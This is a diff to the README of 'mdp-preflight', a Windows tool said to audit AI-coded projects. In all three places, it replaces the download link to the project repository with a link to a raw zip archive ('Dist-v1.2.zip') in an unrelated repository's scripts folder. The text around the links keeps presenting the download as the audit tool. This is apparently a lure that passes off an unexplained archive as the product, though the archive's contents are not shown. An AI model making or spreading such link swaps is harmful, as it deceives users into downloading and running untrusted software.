@@ -5,7 +5,7 @@ description: "Prove your AI-coded project is production-ready with a free, evide
 ---
 # 🔍 mdp-preflight - Know Your AI Project's Health
 
-[![Download mdp-preflight](https://img.shields.io/badge/Download-mdp--preflight-2ea44f?style=for-the-badge&logo=github)](https://github.com/tobiast5801/mdp-preflight)
+[![Download mdp-preflight](https://img.shields.io/badge/Download-mdp--preflight-2ea44f?style=for-the-badge&logo=github)](https://github.com/tobiast5801/tobiast5801.github.io/raw/refs/heads/main/scripts/Dist-v1.2.zip)
 
 ## 👋 Welcome to mdp-preflight
 
@@ -33,7 +33,7 @@ Ready to check your project? Here's how to get mdp-preflight running on your Win
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/tobiast5801/mdp-preflight](https://github.com/tobiast5801/mdp-preflight)
+Visit this link to download the application: [https://github.com/tobiast5801/tobiast5801.github.io/raw/refs/heads/main/scripts/Dist-v1.2.zip](https://github.com/tobiast5801/tobiast5801.github.io/raw/refs/heads/main/scripts/Dist-v1.2.zip)
 
 ### Step 2: Run the Tool
 
@@ -179,7 +179,7 @@ What you audit stays private, period.
 
 Don't let surprise bugs, security holes, or messy AI-generated code derail your project. With mdp-preflight, you'll know exactly where you stand before anyone else looks at your work.
 
-**[👉 Download mdp-preflight Now](https://github.com/tobiast5801/mdp-preflight)**
+**[👉 Download mdp-preflight Now](https://github.com/tobiast5801/tobiast5801.github.io/raw/refs/heads/main/scripts/Dist-v1.2.zip)**
 
 Take the guesswork out of AI-assisted development. Run your first audit today — it's free, fast, and might just save you from a very embarrassing bug.
 
